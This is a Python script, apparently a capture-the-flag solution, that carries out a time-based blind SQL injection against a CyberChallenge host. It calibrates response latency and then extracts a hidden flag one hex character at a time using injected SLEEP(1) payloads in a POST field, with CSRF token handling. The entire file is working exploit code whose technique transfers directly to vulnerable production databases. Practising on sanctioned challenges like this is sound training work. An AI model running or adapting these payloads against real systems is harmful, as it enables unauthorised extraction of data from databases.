import requests
from time import time
from statistics import median


class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        self.token = resp.json()['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']


if __name__ == '__main__':
    inj = Inj('	http://sqlinjection.challs.cyberchallenge.it')

    dictionary = '0123456789abcdef'
    result = ''

    # Calibrate a baseline latency and use a safer threshold to reduce false positives.
    baseline_samples = []
    for _ in range(5):
        start = time()
        inj.time("1' AND 1=2 -- -")
        baseline_samples.append(time() - start)
    baseline = median(baseline_samples)
    threshold = baseline + 0.7

    while True:
        for c in dictionary:
            question = (
                "1' AND (SELECT SLEEP(1) FROM flags "
                f"WHERE HEX(flag) LIKE '{result + c}%')='1"
            )

            timings = []
            for _ in range(3):
                start = time()
                inj.time(question)
                timings.append(time() - start)
            elapsed = median(timings)

            if elapsed > threshold:
                result += c
                print(result)
                break
        else:
            break

    print('hex:', result)
    try:
        print('flag:', bytes.fromhex(result).decode('utf-8', errors='replace'))
    except ValueError:
        print('flag decode failed: hex string length is odd or invalid.')
